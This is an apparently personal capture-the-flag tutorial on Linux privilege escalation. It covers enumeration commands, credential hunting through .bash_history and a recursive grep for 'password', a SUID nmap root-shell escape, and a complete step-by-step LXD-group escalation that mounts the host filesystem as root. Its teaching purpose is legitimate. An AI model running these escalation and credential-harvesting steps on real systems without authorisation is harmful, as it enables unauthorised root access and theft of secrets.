# Privilege Escalation

- [Introduction](#introduction)
- [Linux Privilege Escalation](#linux-privilege-escalation)
  - [`id`](#id)
  - [`ls /home`](#ls-home)
  - [`cat ~/.bash_history`](#cat-bash-history)
  - [`cat /etc/passwd`](#cat-etcpasswd)
  - [`cat /etc/passwd | grep '/bin/bash'`](#cat-etcpasswd--grep-binbash)
  - [`sudo -l`](#sudo--l)
  - [`cat /etc/crontab`](#cat-etccrontab)
  - [`uname -a`](#uname--a)
  - [`env`](#env)
  - [`groups`](#groups)
  - [`grep -Ri "password" /home /opt 2>/dev/null`](#grep--ri-password-home-opt-2devnull)
  - [`find / -perm -u=s -type f 2>/dev/null`](#find---perm--us--type-f-2devnull)
- [Examples](#examples)
  - [LXD](#lxd)

## Introduction

Most capture the flag events involve scenarios where I have a foothold on a machine and now I need to become a user with more privileges so that I can get flags.

There are two main types of escalations, horizontal privilege escalation and vertical privilege escalation.

A typical example of of vertical privilege escalation is where I move from regular user on a Linux machine to root. In most capture the flag events this is the goal so that I can get the root flag.

A horizontal privilege escalation example is moving from one user to another that is not root. The new user will have their own groups, permissions and resources (folders and files) that the original user didn't have. Therefore, I now have more access to the machine but not root access.

## Linux Privilege Escalation

If I have a shell on a Linux machine, the goal is to become root. The process is part art and part science. Learning how Linux works and practicing can go a long way. Being creative is also very important.

In my experience, enumeration is the most important skill with privilege escalation. For each user that I escalate to (whether vertically or horizontally), I run nearly identical steps. The permissions that each user has are usually unique.

New techniques are constantly being found, and researchers are finding new ways to exploit old systems and vulnerabilities.

I can't talk about Linux privilege escalation without mentioning the [LinPEAS](/tools/linpeas.md) script. The insights that it provides are amazing! But I do not usually go straight to LinPEAS. It is usually a last resort after I have ran the commands below.

These commands are the ones I run manually to see if they provide some quick wins. They are listed in the order that I generally run them in.

### `id`

The `id` command is one of the very first things I run when I log in with a new user on a Linux machine. The group information that it provides lets me know what my starting attack surface is. For example, sometimes in a capture the flag event, I will run the `id` command and see that a user is in the adm group. This means that this user can read a lot of log files in the /var/log directory.

I usually run the `id` command and then check what each group has access to. I note them and continue with other commands. The direction of this and other commands dictates where I should start attacking.

Here is some sample output for the `id` command:

`uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),132(postgres)`

In this case, I would note that the ubuntu user is also in the postgres group. I would make sure I understood what that means and then check the output from the next few sections of commands.

Some groups that speed up the privilege escalation process are:

- sudo
- lxd
- docker

I can use the group information from the `id` command to look for files or directories that are owned by a particular group. For example, if my user is a member of the ctf group, I can look for files on the system owned by that group with the following command:

```bash
$ find / -type f -group ctf 2>/dev/null
```

The `-type f` option tells the find command I want to find files. The `-group ctf` option tells the find command that I am looking for files that belong to the ctf group.

If I wanted to look for directories owned by the same group I would change the `-type f` to `-type d` like so:

```bash
$ find / -type d -group ctf 2>/dev/null
```

### `ls /home`

I want to know what users are on the machine. If possible, I will go into each user's directory and see what files and folders are available. These include things like the following:

- The public and private keys in the .ssh folder.
- The .bash_history file.
- Documents and Desktop folders.
- Out-of-place folders like .git.

So if the user mike has a folder in /home, I would run the following command to explore what is available to me:

```bash
$ ls -lha /home/mike
```

### `cat ~/.bash_history`

If possible, the `.bash_history` file has commands that have been ran by this user before. Users will often leave passwords and other sensitive information in these files. Generally, this file is in each user's home directory.

```bash
$ cat ~/.bash_history
```

### `cat /etc/passwd`

If I can read the /etc/passwd file, it also has information about users of the system and where their home directory is located. Once in a while, the home directory of a user will not be in the /home folder.

### `cat /etc/passwd | grep '/bin/bash'`

This command is just looking for users in the /etc/passwd file that have a bash shell.

### `sudo -l`

If this command does not fail, it will tell me what scripts and binaries I can run as root. From here, I note what scripts, commands and binaries can be ran. I also look at the binaries, scripts, and their containing directories. I am specifically looking at the permissions.

Using the following as an example:

```bash
$ sudo -l
User alice may run the following commands on this host:
    (ALL) NOPASSWD: /opt/scripts/backup.sh

$ ls -lha /opt/scripts
total 92K
drwxr-xr-x 1 root   root   0     0 Jul 17 14:32 ./
drwxr-xr-x 1 root   root   0     0 Jul 18 08:29 ../
-rwxr-xr-x 1 alice  alice  0  1.4K Mar 21 08:27 backup.sh
...
```

I would ask the following questions:

- Does my user own this directory? If so, I can delete the script or binary and replace it with another one that does what I need it to do.
- Does my user own the script or binary? If so, I can make sure I have write permissions and edit it.
- Does the script or binary allow input and what does it do with it? Perhaps I can run shell commands or do a wildcard attack.

If the output of this command produces `sudo NOPASSWD`, I will always check [GTFOBins](https://gtfobins.github.io/) for SUID and Sudo exploits. If I couldn't find anything, I will ask AI and Google to see if anyone has come up with a way to escalate with this binary.

### `cat /etc/crontab`

A lot of capture the flag events have a script that runs every minute that I can exploit to do privilege escalation. If my user has access, this will tell me what crons are running and how often. Here is a sample of a cron that runs each minute and runs a backup script in the home directory of the user mike:

`* * * * * /usr/bin/python /home/mike/backup.py`

### `uname -a`

This command provides information about the kernel. The kernel is code and all code has vulnerabilities. Some kernel attacks can be run to get root access.

I will take the output of this command and check if there are any CVEs related to this kernel. Here is a sample of what running the `uname -a` command outputs:

`Linux my_machine 5.15.0-124-generic #134~20.04.1-Ubuntu SMP Tue Oct 1 15:27:33 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux`

Using the output above, I will type "Linux 5.15.0-124 CVE" into Google to see if there are any vulnerabilities.

### `env`

I know that this is a simple command but it can give a lot of information. This will show paths that binaries are located in. Often times the user I am using has read/write permissions for that directory. Some variables can be hits about what software is running on the machine. It doesn't hurt to have a peek and the rewards can be amazing.

### `groups`

This command give information about what groups the user is apart of. Usually I get this information from the `id` command. The groups give clues about what a user has access to and where I need to look. For example, if I notice a user is a member of the adm group, I know that I can start to look at a lot of log files in /var/log since this group deals with system monitoring tasks.

The section about the `id` command above has sample find commands that can can be used for the output of this command.

### `grep -Ri "password" /home /opt 2>/dev/null`

Developers struggle to sanitize their logs before they write to file. So many capture the flag events have credentials in files. This command looks in two of the more common directories to contains passwords. It looks for the case-insensitive string "password". It will look in all files in the /home and /opt directories.

### `find / -perm -u=s -type f 2>/dev/null`

The SUID (Set User ID) bit is a special permission that allows a user to run a binary with the privileges of the binary's owner, rather than their own user privileges. In other words, I can use a binary that root owns and run that binary as root instead of my regular user. An example of a binary that has the SUID bit set looks like the following:

`-rwsr-xr-x 1 root root 163K Apr   4  2025 /usr/bin/sudo`

Here is an explanation of the above command:

- The `-type f` option tells find to look for files.
- The `-perm -u=s` option tells find to look for files with the user SUID bit set.
- The `2>/dev/null` tells the command to redirect all errors to /dev/null (do not show errors).

I pair the output of this command with the [GTFOBins website](https://gtfobins.github.io/) to find out if any of the binaries with the SUID bit set can be used to escalate privileges.

#### SUID Example with GTFOBins

One capture the flag exercise had the SUID bit set for nmap. GTFOBins [has two examples with nmap](https://gtfobins.github.io/gtfobins/nmap/#suid) demonstrating how to get a root shell. I like the second example. If the version of nmap is between 2.02 and 5.21 I can get a root shell with the following command:

```bash
sudo nmap --interactive
nmap> !sh
# whoami
root
```

## Examples

### LXD

LXD (pronounced lex-dee) is used to manage virtual machines and system containers. It has very minimal overhead. I have used both Docker and Podman in the past and it works very similar to both.

I can create or download an image, start multiple containers from that single image and have them interact with each other.

The lxc command is used to start and stop containers. To use the lxd and lxc binaries my user was in the lxd group. The lxd group can also mount root filesystems, this will be important for the example below.

The example below will allow a user that is in the lxd group but not root to do a privilege escalation to root. The neat part is that the user will be root in the container and the host will map the actions of the root user in the container to the root user on the host.

Below is an example of how to download an alpine image from github and then run the container. Some of the file names may have changed but the concept should be the same.

Step 1 - Download the image from github.

```bash
$ git clone https://github.com/saghul/lxd-alpine-builder.git
```

Step 2 - Import the image and alias it as alpine.

```bash
$ cd lxd-alpine-builder
$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
```

I normally check if it imported by running the following:

```bash
$ lxc image list
```

Step 3 - Create a container from the image named kwmd.

```bash
$ lxc init alpine kwmd -c security.privileged=true
```

The security.privileged=true configuration option maps the container uid 0 to the host's uid 0. In other words, the container's user is root and will run as root on the host machine.

Step 4 - Map the host hard drive to the container hard drive, I alias the drive as mydrive in this example.

```bash
$ lxc config device add kwmd mydrive disk source=/ path=/mnt/root recursive=true
```

This mounts the / directory on the host to the /mnt/root directory in the container. This combined with the security.privileged=true in step 3 is very dangerous.

Step 5 - Start the container.

```bash
$ lxc start kwmd
```

Step 6 - Enter the container with a shell.

```bash
$ lxc exec kwmd /bin/sh
```

The cursor will show up as a # character to let me know I am root.

I can now modify view or modify any file on the host directory. I just need to remember to prepend any directory with /mnt/root. Here are some examples:

- The /etc directory on the host would be /mnt/root/etc from the container.
- The /home directory on the host would be /mnt/root/home from the container.
- The /root directory on the host would be /mnt/root/root from the container.

Since I am root in the container and security.privileged=true was set, the host operating system maps any of my root container actions to the root user on the host machine.

